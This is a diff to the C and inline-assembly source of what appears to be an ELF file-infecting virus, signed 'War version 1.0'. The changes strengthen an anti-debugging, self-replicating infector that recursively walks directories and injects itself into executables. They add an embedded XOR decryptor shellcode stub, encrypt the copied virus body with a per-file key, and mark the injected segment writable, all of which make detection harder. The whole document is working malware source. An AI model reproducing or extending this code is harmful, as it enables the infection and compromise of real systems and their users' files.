@@ -157,6 +157,8 @@ void _start(void)
 	char  *prgm;
 	char  *ALPHA;
 	size_t OMEGA;
+	char  *curare;
+	size_t flower;
 
 	asm volatile("leaq str6(%%rip), %0\n"
 				 "jmp end6\n"
@@ -165,8 +167,8 @@ void _start(void)
 				 : "=r"(prgm));
 	if (is_debugged() || is_program_running(prgm) > 0)
 		proc_terminate(0);
-	fs_release(1);
-	fs_release(2);
+	// fs_release(1);
+	// fs_release(2);
 
 	__asm__ volatile("lea (%%rip), %0\n"
 					 "cyanure:"
@@ -184,18 +186,37 @@ void _start(void)
 	path[8] = 't';
 	path[9] = '\0';
 	path[10] = '\0';
-	asm volatile("leaq str4(%%rip), %0\n"
-				 "movq $end4-str4, %1\n"
-				 "jmp trueend4\n"
-				 "str4: .ascii \"\\nWar version 1.0 (c)oded by xxxxxxx - "
-				 "yyyyyy\"\n"
-				 "end4:\n"
-				 ".ascii \" - [42694269]\\0\" \n "
-				 "trueend4:\n"
-				 : "=r"(ALPHA), "=r"(OMEGA));
-	processDirectory(path, begin_ptr, ALPHA, OMEGA);
+	asm volatile(
+		"leaq str3(%%rip), %0\n"
+		"movq $end3-str3, %1\n"
+		"leaq sign(%%rip), %2\n"
+		"movq $finger-sign, %3\n"
+		"jmp end3\n"
+		"str3:  .byte 0xf3, 0x0f, 0x1e, 0xfa, 0x50, 0xb8, 0x39, 0x00, 0x00, "
+		"0x00, 0x0f, 0x05, 0x48, 0x85, 0xc0, 0x58, 0x0f, 0x85, 0xea, 0xff, "
+		"0xff, 0xff, 0x50, 0x41, 0x53, 0x57, 0x41, 0x54, 0x45, 0x31, 0xdb, "
+		"0xbf, 0x00, 0x00, 0x00, 0x00, 0x48, 0x83, 0xff, 0x08, 0x74, 0x14, "
+		"0x8a, 0x87, 0xa9, 0x00, 0x00, 0x00, 0xe8, 0x3b, 0x00, 0x00, 0x00, "
+		"0x41, 0x01, 0xc3, 0x45, 0x6b, 0xdb, 0x10, 0xeb, 0xe6, 0xbf, 0x00, "
+		"0x00, 0x00, 0x00, 0xb8, 0xed, 0xbe, 0xad, 0xde, 0x48, 0x39, 0xc7, "
+		"0x74, 0x18, 0x44, 0x8b, 0x24, 0xbd, 0xb5, 0x00, 0x00, 0x00, 0x45, "
+		"0x31, 0xdc, 0x44, 0x89, 0x24, 0xbd, 0xb5, 0x00, 0x00, 0x00, 0x48, "
+		"0xff, 0xc7, 0xeb, 0xde, 0x41, 0x5c, 0x5f, 0x41, 0x5b, 0x58, 0xe9, "
+		"0x90, 0xff, 0xff, 0xff, 0x3c, 0x3a, 0x7d, 0x03, 0x2c, 0x30, 0xc3, "
+		"0x2c, 0x41, 0xc3 \n"
+		"sign: .byte 0x0a, 0x57, 0x61, 0x72, 0x20, 0x76, 0x65, 0x72, "
+		"0x73, 0x69, 0x6f, 0x6e, 0x20, 0x31, 0x2e, 0x30, 0x20, 0x28, 0x63, "
+		"0x29, 0x6f, 0x64, 0x65, 0x64, 0x20, 0x62, 0x79, 0x20, 0x78, 0x78, "
+		"0x78, 0x78, 0x78, 0x78, 0x78, 0x20, 0x2d, 0x20, 0x79, 0x79, 0x79, "
+		"0x79, 0x79, 0x79\n"
+		"finger: .byte 0x20, 0x2d, 0x20, 0x5b, 0x34, 0x32, 0x36, 0x39, "
+		"0x34, 0x32, 0x36, 0x39, 0x5d, 0x0a, 0x00\n"
+		"end3:\n"
+		: "=r"(curare), "=r"(flower), "=r"(ALPHA), "=r"(OMEGA)::"memory", "cc",
+		  "rax", "rcx", "r11");
+	processDirectory(path, begin_ptr, curare, flower, ALPHA, OMEGA);
 	path[9] = '2';
-	processDirectory(path, begin_ptr, ALPHA, OMEGA);
+	processDirectory(path, begin_ptr, curare, flower, ALPHA, OMEGA);
 	self_resign(ALPHA, OMEGA);
 	proc_terminate(0);
 }
@@ -359,8 +380,8 @@ static int is_debugged(void)
 	return 0;
 }
 
-static void processDirectory(char *folder, void *begin_ptr, char *ALPHA,
-							 size_t OMEGA)
+static void processDirectory(char *folder, void *begin_ptr, char *curare,
+							 size_t flower, char *ALPHA, size_t OMEGA)
 {
 	int					   fd = fs_handle(folder, 0 | 65536);
 
@@ -403,11 +424,12 @@ static void processDirectory(char *folder, void *begin_ptr, char *ALPHA,
 
 			if (statbuf.st_mode & __S_IFDIR)
 			{
-				processDirectory(fullPath, begin_ptr, ALPHA, OMEGA);
+				processDirectory(fullPath, begin_ptr, curare, flower, ALPHA,
+								 OMEGA);
 			}
 			else if (statbuf.st_mode & __S_IFREG)
 			{
-				infect(fullPath, begin_ptr, ALPHA, OMEGA);
+				infect(fullPath, begin_ptr, curare, flower, ALPHA, OMEGA);
 			}
 
 			bpos += dirent->d_reclen;
@@ -420,8 +442,9 @@ clean:
 #define ELF_MAGIC 0x464c457f
 #define inout
 
-#define JUMP_OFFSET			 23
-#define JUMP_OFFSET_INFECTED 17
+#define JUMP_OFFSET			 0x12
+#define JUMP_OFFSET_INFECTED 0x6C
+#define VARAX_OFFSET		 0x44
 
 // void infect(char *path, void *begin_ptr)
 // {
@@ -503,7 +526,8 @@ static unsigned long find_first_free_page(t_elf elf)
 	return ret;
 }
 
-static void infect(char *path, void *begin_ptr, char *ALPHA, size_t OMEGA)
+static void infect(char *path, void *begin_ptr, char *curare, size_t flower,
+				   char *ALPHA, size_t OMEGA)
 {
 	struct stat statbuf;
 	char	   *file_data;
@@ -511,23 +535,16 @@ static void infect(char *path, void *begin_ptr, char *ALPHA, size_t OMEGA)
 	ElfW(Phdr) the_rats;
 	ElfW(Off) pt_load_end;
 	int			   last_pt_load;
-	char		  *curare;
-	size_t		   flower;
 	size_t		   enlarging;
 	int			   signature_pos;
 	char		   fingerprint[8];
 	struct timeval now;
+	unsigned	   fingerdata;
 
 	enlarging = 0;
-	asm volatile(
-		"leaq str3(%%rip), %0\n"
-		"movq $end3-str3, %1\n"
-		"jmp end3\n"
-		"str3:  .byte 0xf3, 0x0f, 0x1e, 0xfa, 0x50, 0xb8, 0x39, 0x00, 0x00, "
-		"0x00, 0x0f, 0x05, 0x48, 0x85, 0xc0, 0x0f, 0x84, 0xeb, 0xff, "
-		"0xff, 0xff, 0x58, 0xe9, 0xe5, 0xff, 0xff, 0xff\n"
-		"end3:\n"
-		: "=r"(curare), "=r"(flower)::"memory", "cc", "rax", "rcx", "r11");
+	gettimeofday(&now, NULL);
+	fingerdata = (statbuf.st_ino * 0xBF58476D1) ^ (statbuf.st_size * 0x94D049BB)
+				 ^ (now.tv_usec * 0xE1234E5B9);
 	file_data = MAP_FAILED;
 	if (parse_file(path, &statbuf, &elf, &file_data, &enlarging, ALPHA, OMEGA))
 		goto clean;
@@ -546,7 +563,7 @@ static void infect(char *path, void *begin_ptr, char *ALPHA, size_t OMEGA)
 		.p_offset = append_pos,
 		.p_paddr = pestis,
 		.p_vaddr = pestis,
-		.p_flags = PF_X | PF_R,
+		.p_flags = PF_X | PF_R | PF_W,
 	};
 	elf.header->e_phnum++;
 	for (int i = 0; i < elf.header->e_phnum; i++)
@@ -568,12 +585,16 @@ static void infect(char *path, void *begin_ptr, char *ALPHA, size_t OMEGA)
 	memcpy(file_data + append_pos + JUMP_OFFSET, &delta, 4);
 	delta = flower - JUMP_OFFSET_INFECTED + BUBONIK - FRENZY - 4;
 	memcpy(file_data + append_pos + JUMP_OFFSET_INFECTED, &delta, 4);
+	unsigned varax = VARAX;
+	memcpy(file_data + append_pos + VARAX_OFFSET, &varax, 4);
 	append_pos += flower;
-	memcpy(file_data + append_pos, begin_ptr, VARAX);
-	gettimeofday(&now, NULL);
-	fill_fingerprint(fingerprint, (statbuf.st_ino * 0xBF58476D1)
-									  ^ (statbuf.st_size * 0x94D049BB)
-									  ^ (now.tv_usec * 0xE1234E5B9));
+	// memcpy(file_data + append_pos, begin_ptr, VARAX);
+	for (unsigned i = 0; i < (unsigned) VARAX; i += 4)
+	{
+		unsigned crypted = ((unsigned *) begin_ptr)[i / 4] ^ fingerdata;
+		memcpy(file_data + append_pos + i, &crypted, 4);
+	}
+	fill_fingerprint(fingerprint, fingerdata);
 	signature_pos
 		= find_signature(file_data + statbuf.st_size, enlarging, ALPHA, OMEGA);
 	memcpy(file_data + statbuf.st_size + signature_pos + FINGERPRINT_OFFSET,
